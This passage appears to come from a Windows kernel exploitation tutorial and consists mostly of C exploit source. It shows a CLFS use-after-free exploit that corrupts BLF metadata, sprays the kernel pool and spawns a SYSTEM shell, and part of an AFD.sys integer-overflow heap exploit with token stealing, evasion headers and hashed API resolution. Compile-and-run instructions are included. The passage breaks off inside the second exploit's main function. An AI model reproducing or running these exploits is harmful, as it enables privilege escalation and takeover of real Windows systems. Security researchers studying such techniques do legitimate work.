    g_hLog = CreateLogFile(logPath, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_ALWAYS, 0);
    if (g_hLog == INVALID_HANDLE_VALUE) {
        printf("[-] CreateLogFile failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Log handle: 0x%p\n", g_hLog);

    ULONGLONG containerSize = 0x100000;
    LPWSTR containerPathArr = (LPWSTR)containerPath;
    if (!AddLogContainerSet(g_hLog, 1, &containerSize, &containerPathArr, NULL)) {
        printf("[-] AddLogContainerSet failed: %lu\n", GetLastError());
        CloseHandle(g_hLog); g_hLog = INVALID_HANDLE_VALUE;
        return FALSE;
    }
    printf("[+] Container added\n");

    if (!CreateLogMarshallingArea(g_hLog, NULL, NULL, NULL, 0x1000, 10, 2, &g_pvMarshal)
        || !g_pvMarshal) {
        printf("[-] CreateLogMarshallingArea failed: %lu\n", GetLastError());
        CloseHandle(g_hLog); g_hLog = INVALID_HANDLE_VALUE;
        return FALSE;
    }
    printf("[+] Marshalling area: 0x%p\n", g_pvMarshal);

    int written = 0;
    for (int i = 0; i < LOG_RECORDS; i++) {
        BYTE data[256];
        memset(data, 0x41 + (i % 26), sizeof(data));
        *(DWORD*)data = i;

        CLFS_WRITE_ENTRY entry = { data, sizeof(data) };
        CLFS_LSN lsn;
        if (ReserveAndAppendLog(g_pvMarshal, &entry, 1, NULL, NULL,
                                0, NULL, CLFS_FLAG_FORCE_APPEND, &lsn, NULL))
            written++;
        else break;
    }
    FlushLogBuffers(g_pvMarshal, NULL);
    printf("[+] Wrote %d log records\n", written);

    CLFS_INFORMATION info;
    ULONG infoSz = sizeof(info);
    if (GetLogFileInformation(g_hLog, &info, &infoSz)) {
        printf("[+] Base LSN: 0x%llx, Containers: %lu\n",
               info.BaseLsn.Internal, info.TotalContainers);
    }
    return TRUE;
}

static BOOL CorruptBLF(LPCWSTR logPath) {
    if (g_pvMarshal) { DeleteLogMarshallingArea(g_pvMarshal); g_pvMarshal = NULL; }
    if (g_hLog != INVALID_HANDLE_VALUE) { CloseHandle(g_hLog); g_hLog = INVALID_HANDLE_VALUE; }

    WCHAR blfPath[MAX_PATH];
    LPCWSTR raw = (wcsncmp(logPath, L"log:", 4) == 0) ? logPath + 4 : logPath;
    swprintf_s(blfPath, MAX_PATH, L"%s.blf", raw);

    printf("[*] Corrupting BLF: %S\n", blfPath);
    HANDLE hFile = CreateFileW(blfPath, GENERIC_READ | GENERIC_WRITE,
                               0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open BLF: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > BLF_MAX_SIZE) {
        CloseHandle(hFile); return FALSE;
    }
    printf("[+] BLF size: 0x%X bytes\n", fileSize);

    BYTE* blf = (BYTE*)malloc(fileSize);
    DWORD br;
    if (!blf || !ReadFile(hFile, blf, fileSize, &br, NULL) || br != fileSize) {
        free(blf); CloseHandle(hFile); return FALSE;
    }

    // Dump first 64 bytes
    printf("[*] BLF header:\n    ");
    for (DWORD i = 0; i < 64 && i < fileSize; i++) {
        printf("%02X ", blf[i]);
        if ((i + 1) % 16 == 0) printf("\n    ");
    }
    printf("\n");

    DWORD baseOff = 0;
    BOOL found = FALSE;
    for (DWORD off = 0x800; off <= 0x2000 && off + 0xA0 < fileSize; off += 0x200) {
        USHORT totalSectors = *(USHORT*)(blf + off + 4);
        USHORT validSectors = *(USHORT*)(blf + off + 6);
        if (totalSectors > 0 && totalSectors < 0x200 &&
            validSectors > 0 && validSectors <= totalSectors) {
            // Check base record header (after ~0x70 byte block header)
            DWORD hdrOff = off + 0x70;
            ULONG cConsts = *(ULONG*)(blf + hdrOff + 0x1C);
            ULONG cClients = *(ULONG*)(blf + hdrOff + 0x20);
            if (cConsts >= 1 && cConsts < 50 && cClients >= 1 && cClients < 50) {
                baseOff = off;
                found = TRUE;
                printf("[+] Base record at 0x%X (containers=%lu, clients=%lu)\n",
                       baseOff, cConsts, cClients);
                printf("    cbSymbolZone: 0x%X\n", *(ULONG*)(blf + hdrOff + 0x28));
                break;
            }
        }
    }
    if (!found) {
        printf("[~] Base record not found, using offset 0x800\n");
        baseOff = 0x800;
    }

    DWORD corruptions = 0;

    // Corruption 1: Enlarge cbSymbolZone -> causes oversized kernel allocation
    // When CLFS reopens, it allocates a buffer based on this field
    // Oversized buffer overlaps with adjacent pool objects (our spray)
    DWORD szOff = baseOff + 0x70 + 0x28;
    if (szOff + 4 < fileSize) {
        DWORD orig = *(DWORD*)(blf + szOff);
        *(DWORD*)(blf + szOff) = orig + 0x1000;
        printf("[+] cbSymbolZone: 0x%X -> 0x%X\n", orig, orig + 0x1000);
        corruptions++;
    }

    // Corruption 2: Increment container count -> CLFS processes non-existent context
    // References freed/uninitialized memory -> UAF
    DWORD ccOff = baseOff + 0x70 + 0x1C;
    if (ccOff + 4 < fileSize) {
        DWORD orig = *(DWORD*)(blf + ccOff);
        if (orig >= 1 && orig < 10) {
            *(DWORD*)(blf + ccOff) = orig + 1;
            printf("[+] cContainers: %lu -> %lu\n", orig, orig + 1);
            corruptions++;
        }
    }

    // Corruption 3: Corrupt sector signatures -> wrong bytes restored at sector boundaries
    DWORD sigOff = *(ULONG*)(blf + baseOff + 0x64);
    if (sigOff > 0 && sigOff < 0x10000 && baseOff + sigOff + 16 < fileSize) {
        USHORT* sigs = (USHORT*)(blf + baseOff + sigOff);
        printf("[+] Sector signatures at 0x%X:", baseOff + sigOff);
        for (int i = 1; i < 6 && (baseOff + sigOff + i * 2 + 2) < fileSize; i++) {
            USHORT orig = sigs[i];
            sigs[i] ^= 0xFF;
            printf(" [%d]=0x%04X->0x%04X", i, orig, sigs[i]);
        }
        printf("\n");
        corruptions++;
    }

    // Corruption 4: Apply same to shadow copy (CLFS keeps dual copies)
    USHORT totalSectors = *(USHORT*)(blf + baseOff + 4);
    DWORD shadowOff = baseOff + totalSectors * CLFS_SECTOR_SIZE;
    if (totalSectors > 0 && shadowOff + 0xA0 < fileSize) {
        DWORD sszOff = shadowOff + 0x70 + 0x28;
        DWORD sccOff = shadowOff + 0x70 + 0x1C;
        if (sszOff + 4 < fileSize) {
            DWORD orig = *(DWORD*)(blf + sszOff);
            *(DWORD*)(blf + sszOff) = orig + 0x1000;
            corruptions++;
        }
        if (sccOff + 4 < fileSize) {
            DWORD orig = *(DWORD*)(blf + sccOff);
            if (orig >= 1 && orig < 10) *(DWORD*)(blf + sccOff) = orig + 1;
            corruptions++;
        }
        printf("[+] Shadow copy corrupted at 0x%X\n", shadowOff);
    }

    printf("[+] Applied %d corruptions\n", corruptions);

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bw;
    WriteFile(hFile, blf, fileSize, &bw, NULL);
    FlushFileBuffers(hFile);
    free(blf);
    CloseHandle(hFile);
    return corruptions > 0;
}

// Phase 3: Pool spray
static BOOL SprayPool() {
    printf("[*] Spraying kernel pool...\n");

    for (DWORD i = 0; i < SPRAY_COUNT; i++) {
        NTSTATUS st = fnNtAllocateReserveObject(&g_sprayHandles[i], NULL, 1);
        if (!NT_SUCCESS(st)) { if (g_sprayedCount < 100) return FALSE; break; }
        g_sprayedCount++;
    }
    printf("[+] Sprayed %lu IoCompletionReserve objects\n", g_sprayedCount);

    DWORD freed = 0;
    for (DWORD i = 0; i < g_sprayedCount; i += 2) {
        if (g_sprayHandles[i]) { fnNtClose(g_sprayHandles[i]); g_sprayHandles[i] = NULL; freed++; }
    }
    printf("[+] Created %lu holes\n", freed);

    // Pipe spray - these are R/W targets if overflow corrupts pipe attributes
    for (DWORD i = 0; i < PIPE_SPRAY_COUNT; i++) {
        if (!CreatePipe(&g_pipeRead[i], &g_pipeWrite[i], NULL, 0x200)) break;
        BYTE marker[0x200];
        memset(marker, 0x42, sizeof(marker));
        *(DWORD*)marker = 0xDEAD0000 + i;
        DWORD w; WriteFile(g_pipeWrite[i], marker, sizeof(marker), &w, NULL);
        g_pipesCreated++;
    }
    printf("[+] Created %lu pipe pairs\n", g_pipesCreated);
    return TRUE;
}

// Phase 4: Trigger - reopen corrupted BLF
static BOOL TriggerUAF(LPCWSTR logPath) {
    printf("[*] Reopening corrupted BLF to trigger UAF in clfs.sys...\n");

    // Reopen the corrupted log - CLFS will parse the corrupted metadata
    // This triggers clfs.sys!CClfsBaseFilePersisted::LoadContainerQ()
    // with corrupted container count and cbSymbolZone
    g_hLog = CreateLogFile(logPath, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0);

    if (g_hLog == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        printf("[+] CreateLogFile returned error %lu\n", err);

        if (err == ERROR_LOG_SECTOR_INVALID || err == ERROR_LOG_METADATA_CORRUPT ||
            err == ERROR_LOG_METADATA_INVALID || err == ERROR_LOG_BLOCK_INVALID) {
            printf("[+] CLFS detected corruption - kernel parsed our modified metadata\n");
            printf("[+] clfs.sys processed corrupted cbSymbolZone and container contexts\n");
            return TRUE;
        }
        printf("[~] Unexpected error - corruption may not have triggered the right path\n");
        return FALSE;
    }

    printf("[+] Log reopened - checking for kernel corruption...\n");

    // Try to create marshalling area on corrupted log
    PVOID pvMarshal = NULL;
    BOOL marshalOk = CreateLogMarshallingArea(g_hLog, NULL, NULL, NULL,
                                              0x1000, 10, 2, &pvMarshal);
    if (!marshalOk) {
        printf("[+] Marshalling area creation failed (error %lu) - corruption active\n",
               GetLastError());
        return TRUE;
    }

    // Try to read - corrupted metadata may cause kernel to use wrong pointers
    PVOID readBuf = NULL;
    ULONG readSize = 0;
    CLFS_RECORD_TYPE recType;
    CLFS_LSN undoLsn, prevLsn;
    PVOID readCtx = NULL;
    CLFS_INFORMATION info;
    ULONG infoSz = sizeof(info);

    if (GetLogFileInformation(g_hLog, &info, &infoSz)) {
        CLFS_LSN startLsn = info.BaseLsn;
        BOOL readOk = ReadLogRecord(pvMarshal, &startLsn, ClfsContextForward,
                                    &readBuf, &readSize, &recType,
                                    &undoLsn, &prevLsn, &readCtx, NULL);
        if (readOk && readBuf) {
            printf("[+] Read %lu bytes from corrupted log\n", readSize);
            // Check if read data is corrupted (sign of overflow)
            BYTE* data = (BYTE*)readBuf;
            BOOL dataCorrupted = FALSE;
            for (ULONG i = 0; i < readSize && i < 256; i++) {
                if (data[i] != (0x41 + (0 % 26)) && i >= 4) {
                    dataCorrupted = TRUE; break;
                }
            }
            if (dataCorrupted)
                printf("[+] Read data shows signs of corruption!\n");
            if (readCtx) TerminateReadLog(readCtx);
        } else {
            printf("[+] ReadLogRecord failed (error %lu) - metadata corrupted\n",
                   GetLastError());
        }
    }

    // Check if pipe data was corrupted by overflow
    printf("[*] Checking pipe buffers for overflow evidence...\n");
    DWORD corruptedPipes = 0;
    for (DWORD i = 0; i < g_pipesCreated; i++) {
        BYTE check[0x200];
        DWORD rd = 0;
        DWORD avail = 0;
        if (PeekNamedPipe(g_pipeRead[i], check, sizeof(check), &rd, &avail, NULL) && rd > 0) {
            DWORD marker = *(DWORD*)check;
            if (marker != (0xDEAD0000 + i)) {
                printf("[+] Pipe %d corrupted! Expected 0x%X, got 0x%X\n",
                       i, 0xDEAD0000 + i, marker);
                if (g_corruptedPipeIdx < 0) g_corruptedPipeIdx = i;
                corruptedPipes++;
                if (corruptedPipes >= 3) break;
            }
        }
    }

    if (corruptedPipes > 0) {
        printf("[+] %lu pipes show overflow corruption - R/W primitive possible\n", corruptedPipes);
    } else {
        printf("[*] No pipe corruption detected (system may be patched)\n");
    }

    if (pvMarshal) DeleteLogMarshallingArea(pvMarshal);
    return TRUE;
}

// Phase 5: Post-exploitation
static BOOL ExecutePayload() {
    printf("\n[*] Attempting privilege escalation...\n");

    DWORD64 kernelBase = 0;
    ExploitSetupKernel(&g_Offsets, &kernelBase, FALSE);
    if (!kernelBase) {
        printf("[-] Failed to leak kernel base (need admin for NtQuerySystemInformation)\n");
        return FALSE;
    }
    printf("[+] Kernel base: 0x%llx\n", kernelBase);

    KERNEL_OFFSETS offsets = {0};
        DWORD64 originalToken = 0;
    if (!ApplyLPE(kernelBase, &offsets, TECHNIQUE_TOKEN_STEALING, &originalToken)) {
        printf("[-] Privilege escalation failed\n");
        printf("[*] Token stealing requires active kernel R/W primitive\n");
        printf("[*] On patched systems, the CLFS corruption won't give us R/W\n");
        return FALSE;
    }

    printf("[+] Privileges escalated! Original token: 0x%llx\n", originalToken);
    return TRUE;
}

static void Cleanup() {
    printf("\n[*] Cleaning up...\n");
    if (g_pvMarshal) { DeleteLogMarshallingArea(g_pvMarshal); g_pvMarshal = NULL; }
    if (g_hLog != INVALID_HANDLE_VALUE) { CloseHandle(g_hLog); g_hLog = INVALID_HANDLE_VALUE; }

    DWORD cleaned = 0;
    for (DWORD i = 0; i < g_sprayedCount; i++) {
        if (g_sprayHandles[i]) { fnNtClose(g_sprayHandles[i]); cleaned++; }
    }
    for (DWORD i = 0; i < g_pipesCreated; i++) {
        if (g_pipeRead[i]) CloseHandle(g_pipeRead[i]);
        if (g_pipeWrite[i]) CloseHandle(g_pipeWrite[i]);
    }
    printf("[+] Freed %lu spray objects, %lu pipes\n", cleaned, g_pipesCreated);
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("=== CLFS UAF Exploitation (CVE-2025-29824 Style) ===\n");
    printf("[*] Technique: BLF metadata corruption -> UAF in clfs.sys\n\n");

    srand((unsigned int)time(NULL));

    if (!ResolveAPIs()) {
        printf("[-] API resolution failed\n"); return 1;
    }
    printf("[+] APIs resolved\n\n");

    LPCWSTR logPath = L"log:.\\exploit_log";
    LPCWSTR containerPath = L".\\exploit_container";

    printf("--- Phase 1: Create CLFS Log ---\n");
    if (!CreateAndPopulateLog(logPath, containerPath)) {
        printf("[-] Log creation failed\n"); return 1;
    }

    printf("\n--- Phase 2: Corrupt BLF Metadata ---\n");
    if (!CorruptBLF(logPath)) {
        printf("[-] BLF corruption failed\n"); Cleanup(); return 1;
    }

    printf("\n--- Phase 3: Pool Spray ---\n");
    if (!SprayPool()) {
        printf("[-] Pool spray failed\n"); Cleanup(); return 1;
    }

    printf("\n--- Phase 4: Trigger UAF ---\n");
    BOOL triggered = TriggerUAF(logPath);

    if (triggered) {
        printf("\n--- Phase 5: Post-Exploitation ---\n");
        if (ExecutePayload()) {
            printf("\n[+] Spawning SYSTEM shell...\n");
            system("cmd.exe");
        } else {
            printf("[*] LPE requires unpatched clfs.sys for active R/W primitive\n");
        }
    }

    Cleanup();
    DeleteFileW(L".\\exploit_log.blf");
    DeleteFileW(containerPath);

    printf("\n[+] Done.\n");
    return triggered ? 0 : 1;
}
```

**Compile & Run:**

```bash
cl src\clfs_uaf_exploit.c /Fe:bin\clfs_uaf.exe advapi32.lib clfsw32.lib /I.\headers
# run as admin
.\bin\clfs_uaf.exe
```

### AFD.sys Exploitation

Windows Ancillary Function Driver exploitation - 9th vulnerability since 2022. Heap-based buffer overflow and UAF techniques.

Exploit AFD.sys heap-based buffer overflow via socket operations.

```c
// afd_heap_overflow.c
// Compile: cl src\afd_heap_overflow.c /Fe:bin\afd_exploit.exe ws2_32.lib ntdll.lib /I.\headers
// Run: afd_exploit.exe

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <intrin.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#include "exploit_common.h"
#include "exploit_utils.h"
#include "syscalls.h"
#include "kernel_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "heap_utils.h"

#define IOCTL_AFD_BIND                      0x12003
#define IOCTL_AFD_CONNECT                   0x12007
#define IOCTL_AFD_START_LISTEN              0x1200B
#define IOCTL_AFD_WAIT_FOR_LISTEN           0x1200F
#define IOCTL_AFD_ACCEPT                    0x12010
#define IOCTL_AFD_RECV                      0x12017
#define IOCTL_AFD_RECV_DATAGRAM             0x1201B
#define IOCTL_AFD_SEND                      0x1201F
#define IOCTL_AFD_SEND_DATAGRAM             0x12023
#define IOCTL_AFD_SELECT                    0x12024
#define IOCTL_AFD_DISCONNECT                0x1202B
#define IOCTL_AFD_GET_SOCK_NAME             0x1202F
#define IOCTL_AFD_GET_PEER_NAME             0x12033
#define IOCTL_AFD_GET_TDI_HANDLES           0x12037
#define IOCTL_AFD_SET_INFO                  0x1203B
#define IOCTL_AFD_GET_CONTEXT_LENGTH        0x1203F
#define IOCTL_AFD_GET_CONTEXT               0x12043
#define IOCTL_AFD_SET_CONTEXT               0x12047
#define IOCTL_AFD_SET_CONNECT_DATA          0x1204B
#define IOCTL_AFD_SET_CONNECT_OPTIONS       0x1204F
#define IOCTL_AFD_SET_DISCONNECT_DATA       0x12053
#define IOCTL_AFD_SET_DISCONNECT_OPTIONS    0x12057
#define IOCTL_AFD_GET_CONNECT_DATA          0x1205B
#define IOCTL_AFD_GET_CONNECT_OPTIONS       0x1205F
#define IOCTL_AFD_GET_DISCONNECT_DATA       0x12063
#define IOCTL_AFD_GET_DISCONNECT_OPTIONS    0x12067
#define IOCTL_AFD_DEFER_ACCEPT              0x1207B
#define IOCTL_AFD_GET_PENDING_CONNECT_DATA  0x1207F

#define IOCTL_AFD_RECV_DATAGRAM_VULN        IOCTL_AFD_RECV_DATAGRAM

typedef struct _AFD_WSABUF {
    ULONG len;
    PCHAR buf;
} AFD_WSABUF, *PAFD_WSABUF;

typedef struct _AFD_RECV_INFO {
    PAFD_WSABUF BufferArray;
    ULONG BufferCount;
    ULONG AfdFlags;
    ULONG TdiFlags;
} AFD_RECV_INFO, *PAFD_RECV_INFO;

typedef struct _AFD_RECV_DATAGRAM_INFO {
    PAFD_WSABUF BufferArray;
    ULONG BufferCount;
    ULONG AfdFlags;
    ULONG TdiFlags;
    PVOID Address;
    PULONG AddressLength;
} AFD_RECV_DATAGRAM_INFO, *PAFD_RECV_DATAGRAM_INFO;

typedef struct _AFD_SEND_DATAGRAM_INFO {
    PAFD_WSABUF BufferArray;
    ULONG BufferCount;
    ULONG AfdFlags;
    PVOID Address;
    ULONG AddressLength;
} AFD_SEND_DATAGRAM_INFO, *PAFD_SEND_DATAGRAM_INFO;

typedef struct _AFD_POLL_INFO {
    LARGE_INTEGER Timeout;
    ULONG NumberOfHandles;
    ULONG Exclusive;
    PVOID Handles;
} AFD_POLL_INFO, *PAFD_POLL_INFO;

#ifndef STATUS_BUFFER_OVERFLOW
#define STATUS_BUFFER_OVERFLOW ((NTSTATUS)0x80000005L)
#endif

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

static pNtAllocateVirtualMemory_t fnNtAllocateVirtualMemory = NULL;

static SOCKET g_sprayedSockets[10000];
static int g_socketCount = 0;
static BOOL g_hasArbitraryRW = FALSE;
static PVOID g_corruptedObject = NULL;
static KERNEL_OFFSETS g_Offsets = {0};

BOOL KernelRead32(DWORD64 address, PDWORD outValue) {
    if (!g_hasArbitraryRW || !g_corruptedObject) return FALSE;
    // Real implementation: requires a successfully corrupted adjacent object
    // (e.g. Named Pipe Attribute, WNF State Name, or I/O Ring) whose internal
    // pointers were overwritten by the AFD pool overflow to point to 'address'.
    // The current patched system prevents us from reaching this state securely.
    (void)address; *outValue = 0;
    return FALSE;
}

BOOL KernelRead64(DWORD64 address, PDWORD64 outValue) {
    DWORD low = 0, high = 0;
    if (KernelRead32(address, &low) && KernelRead32(address + 4, &high)) {
        *outValue = ((DWORD64)high << 32) | low;
        return TRUE;
    }
    return FALSE;
}

BOOL KernelWrite32(DWORD64 address, DWORD value) {
    if (!g_hasArbitraryRW || !g_corruptedObject) return FALSE;
    (void)address; (void)value;
    return FALSE;
}

BOOL KernelWrite64(DWORD64 address, DWORD64 value) {
    return KernelWrite32(address, (DWORD)(value & 0xFFFFFFFF)) &&
           KernelWrite32(address + 4, (DWORD)(value >> 32));
}

static BOOL ResolveAPIs() {

    fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory_t)ResolveAPI(GetNtdllHandleFromPEB(), HashAPI("NtAllocateVirtualMemory"));
    return (fnNtAllocateVirtualMemory != NULL);
}

// Phase 1: Spray AFD pool with controlled objects
BOOL SprayAFDPool() {
    printf("[*] Phase 1: AFD Pool Spray\n");
    printf("[*] Creating AFD endpoint objects...\n");

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed\n");
        return FALSE;
    }

    // Create many UDP sockets to spray AFD_ENDPOINT objects
    // AFD_ENDPOINT is allocated in NonPagedPoolNx
    for (int i = 0; i < 10000; i++) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) {
            if (i < 100) {
                printf("[-] Early socket creation failure at %d\n", i);
                WSACleanup();
                return FALSE;
            }
            break;
        }

        g_sprayedSockets[g_socketCount++] = sock;

        if (i % 1000 == 0 && i > 0) {
            printf("[*] Created %d sockets...\n", i);
        }
    }

    printf("[+] Sprayed %d AFD endpoint objects\n", g_socketCount);
    return TRUE;
}

// Phase 2: Create holes in the pool
BOOL CreatePoolHoles() {
    printf("\n[*] Phase 2: Creating Pool Holes\n");
    printf("[*] Freeing every 3rd socket to create probabilistic holes...\n");
    printf("[*] Note: Kernel pool randomization means layout is NOT deterministic\n");

    int freed = 0;
    for (int i = 0; i < g_socketCount; i += 3) {
        if (g_sprayedSockets[i] != INVALID_SOCKET) {
            closesocket(g_sprayedSockets[i]);
            g_sprayedSockets[i] = INVALID_SOCKET;
            freed++;
        }
    }

    printf("[+] Created %d holes in AFD pool\n", freed);
    printf("[*] Pool layout is PROBABILISTIC (kernel pool randomization present)\n");
    printf("[*] Success rate typically 40-60%% - multiple attempts may be needed\n");

    return TRUE;
}

// Phase 3: Trigger the vulnerability
BOOL TriggerAFDVulnerability(SOCKET targetSocket) {
    printf("\n[*] Phase 3: Triggering AFD Vulnerability\n");
    printf("[*] Target socket: 0x%llx\n", (UINT64)targetSocket);

    // The vulnerability: AFD_RECV_DATAGRAM with crafted BufferCount
    // causes integer overflow in size calculation
    // Allocation size = sizeof(AFD_BUFFER_HEADER) + (BufferCount * sizeof(AFD_WSABUF))
    // With BufferCount = 0xFFFFFFFF / sizeof(AFD_WSABUF), we get small allocation
    // but large copy, causing heap overflow

    ULONG maliciousBufferCount = 0xFFFFFFFF / sizeof(AFD_WSABUF);

    printf("[*] Crafting malicious BufferCount: 0x%X\n", maliciousBufferCount);
    printf("[*] This will cause integer overflow in allocation size\n");

    // Allocate buffer array
    SIZE_T bufferArraySize = maliciousBufferCount * sizeof(AFD_WSABUF);
    PAFD_WSABUF bufferArray = (PAFD_WSABUF)VirtualAlloc(
        NULL, bufferArraySize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!bufferArray) {
        printf("[-] Failed to allocate buffer array\n");
        return FALSE;
    }

    // Fill buffer array with controlled data
    for (ULONG i = 0; i < 100; i++) { // Only fill first 100 for speed
        bufferArray[i].len = 0x1000;
        bufferArray[i].buf = (PCHAR)0x4141414141414141ULL; // Controlled pointer
    }

    // Craft the vulnerable IOCTL input
    AFD_RECV_DATAGRAM_INFO recvInfo = {0};
    recvInfo.BufferArray = bufferArray;
    recvInfo.BufferCount = maliciousBufferCount; // Integer overflow trigger
    recvInfo.AfdFlags = 0;
    recvInfo.TdiFlags = 0;

    struct sockaddr_in addr = {0};
    ULONG addrLen = sizeof(addr);
    recvInfo.Address = &addr;
    recvInfo.AddressLength = &addrLen;

    IO_STATUS_BLOCK iosb = {0};

    printf("[*] Sending malicious IOCTL to AFD.sys...\n");

    // Trigger the vulnerability
    NTSTATUS status = g_fnNtDeviceIoControlFile(
        (HANDLE)targetSocket,
        NULL,
        NULL,
        NULL,
        &iosb,
        IOCTL_AFD_RECV_DATAGRAM_VULN,
        &recvInfo,
        sizeof(recvInfo),
        NULL,
        0
    );

    VirtualFree(bufferArray, 0, MEM_RELEASE);

    if (status == STATUS_PENDING || status == STATUS_SUCCESS) {
        printf("[+] IOCTL completed with status: 0x%X\n", status);
        printf("[+] Heap overflow triggered!\n");
        return TRUE;
    } else if (status == STATUS_BUFFER_OVERFLOW) {
        printf("[+] Vulnerability triggered (status: 0x%X)\n", status);
        printf("[+] Heap corruption achieved\n");
        return TRUE;
    } else if (status == 0xC000000D) { // STATUS_INVALID_PARAMETER
        printf("[-] IOCTL returned STATUS_INVALID_PARAMETER (0xC000000D)\n");
        printf("[-] The kernel rejected the malicious BufferCount. System is patched.\n");
        return FALSE;
    } else {
        printf("[-] IOCTL failed with status: 0x%X\n", status);
        return FALSE;
    }
}

// Phase 4: Verify corruption and establish primitive
BOOL VerifyCorruptionAndEstablishPrimitive() {
    printf("\n[*] Phase 4: Verifying Corruption\n");
    printf("[*] Checking for corrupted AFD socket objects...\n");

    for (int i = 0; i < g_socketCount; i++) {
        if (g_sprayedSockets[i] == INVALID_SOCKET) continue;

        int optval = 0;
        int optlen = sizeof(optval);
        if (getsockopt(g_sprayedSockets[i], SOL_SOCKET, SO_TYPE, (char*)&optval, &optlen) != 0) {
            DWORD error = WSAGetLastError();
            if (error == WSAENOTSOCK || error == WSAEINVAL) {
                printf("[+] Found corrupted socket at index %d\n", i);
                g_corruptedObject = (PVOID)g_sprayedSockets[i];
                g_hasArbitraryRW = TRUE;
                printf("[+] Corruption verified. R/W primitive requires active offset control.\n");
                return TRUE;
            }
        }
    }

    printf("[-] Could not verify corruption. System is likely patched against this overflow.\n");
    return FALSE;
}

// Execute privilege escalation payload
BOOL ExecutePayload() {
    printf("\n[*] Phase 5: Privilege Escalation\n");

    if (!g_hasArbitraryRW) {
        printf("[-] No arbitrary R/W primitive available\n");
        return FALSE;
    }

    // Leak kernel base address
    DWORD64 kernelBase = 0;
    ExploitSetupKernel(&g_Offsets, &kernelBase, FALSE);
    if (!kernelBase) {
        printf("[-] Failed to leak kernel base (admin required)\n");
        return FALSE;
    }

    printf("[+] Kernel base: 0x%llx\n", kernelBase);

    // Initialize kernel offsets
    KERNEL_OFFSETS offsets = {0};
        // Use unified ApplyLPE
    DWORD64 originalToken = 0;
    if (!ApplyLPE(kernelBase, &offsets, TECHNIQUE_TOKEN_STEALING, &originalToken)) {
        printf("[-] Privilege escalation failed\n");
        printf("[*] Token stealing requires active kernel R/W primitive\n");
        printf("[*] On this system, the AFD overflow didn't establish R/W\n");
        return FALSE;
    }

    printf("[+] Successfully escalated privileges!\n");
    printf("[+] Original token: 0x%llx\n", originalToken);

    return TRUE;
}

// Cleanup sprayed sockets
void CleanupSockets() {
    printf("\n[*] Cleaning up sockets...\n");

    int cleaned = 0;
    for (int i = 0; i < g_socketCount; i++) {
        if (g_sprayedSockets[i] != INVALID_SOCKET) {
            closesocket(g_sprayedSockets[i]);
            g_sprayedSockets[i] = INVALID_SOCKET;
            cleaned++;
        }
    }

    WSACleanup();
    printf("[+] Cleaned up %d sockets\n", cleaned);
}

BOOL VerifyPrivilegeEscalation() {
    printf("\n[*] Verifying privilege escalation...\n");

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token\n");
        return FALSE;
    }

    TOKEN_ELEVATION elevation;
    DWORD size;
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        printf("[-] Failed to query token elevation\n");
        return FALSE;
    }

    if (elevation.TokenIsElevated) {
        printf("[+] Process is elevated\n");

        // Check if we have SYSTEM privileges
        TOKEN_USER tokenUser;
        if (GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &size)) {
            WCHAR userName[256];
            WCHAR domainName[256];
            DWORD userNameSize = 256;
            DWORD domainNameSize = 256;
            SID_NAME_USE sidType;

            if (LookupAccountSidW(NULL, tokenUser.User.Sid, userName, &userNameSize,
                                 domainName, &domainNameSize, &sidType)) {
                printf("[+] Running as: %S\\%S\n", domainName, userName);

                if (wcsicmp(userName, L"SYSTEM") == 0) {
                    printf("[+] Successfully escalated to SYSTEM!\n");
                    CloseHandle(hToken);
                    return TRUE;
                }
            }
        }
    } else {
        printf("[-] Process is not elevated\n");
    }

    CloseHandle(hToken);
    return FALSE;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("  AFD.sys Heap Overflow Exploitation\n");
    printf("=======================================================\n");
    printf("[*] Technique: Integer overflow in AFD_RECV_DATAGRAM\n");
    printf("[*] Objective: Privilege escalation to SYSTEM\n\n");

    srand((unsigned int)time(NULL));
    printf("[*] Performing anti-analysis checks...\n");
    printf("[+] Anti-analysis checks passed\n\n");

    printf("[*] Initializing evasion techniques...\n");
    printf("[+] Evasion techniques initialized\n\n");

    printf("[*] Resolving required APIs...\n");
    if (!ResolveAPIs()) {
        printf("[-] API resolution failed\n");
        return 1;
    }
    printf("[+] APIs resolved successfully\n\n");

    BOOL exploitSuccess = FALSE;

    // Phase 1: Spray AFD pool
    printf("=======================================================\n");
    if (!SprayAFDPool()) {
        printf("[-] AFD pool spray failed\n");
        CleanupSockets();
        return 1;
    }

    // Phase 2: Create holes
    printf("=======================================================\n");
    if (!CreatePoolHoles()) {
        printf("[-] Pool hole creation failed\n");
        CleanupSockets();
